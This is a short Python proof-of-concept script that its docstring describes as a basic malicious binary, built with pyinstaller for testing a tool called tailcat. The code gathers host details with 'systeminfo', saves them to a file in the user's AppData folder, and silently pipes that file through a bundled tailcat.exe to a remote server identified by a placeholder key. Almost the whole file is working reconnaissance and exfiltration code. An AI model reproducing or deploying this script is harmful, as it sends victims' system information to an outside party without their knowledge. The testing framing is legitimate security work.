"""
This POC (Proof of Concept) is designed to demonstrate how a malicious binary could operate at a VERY basic level, but it is not intended for real-world use. 
It collects system information and sends it to a specified server using tailcat.

This code was compiled using pyinstaller and used during our testing of tailcat.
"""

import os
import subprocess
import sys

def get_runtime_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.abspath(relative_path)

def fingerprint():
    systeminfo = subprocess.run(["systeminfo"], capture_output=True, text=True).stdout.strip()
    return systeminfo


def main():
    user = os.getlogin()
    path = f"C:\\Users\\{user}\\AppData\\Local"

    with open(os.path.join(path, "fingerprint.txt"), "w") as f:
        f.write(fingerprint())

    server_key = "<YOUR_SERVER_KEY_HERE>"  
    assets_folder = get_runtime_path("assets")
    binary_tailcat = os.path.join(assets_folder, "tailcat.exe")
    file = os.path.join(path, "fingerprint.txt")

    try: 
        with open(file, "r") as f:
            subprocess.run(
                [binary_tailcat, server_key], 
                stdin=f,
                check=True
            )

    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    main()

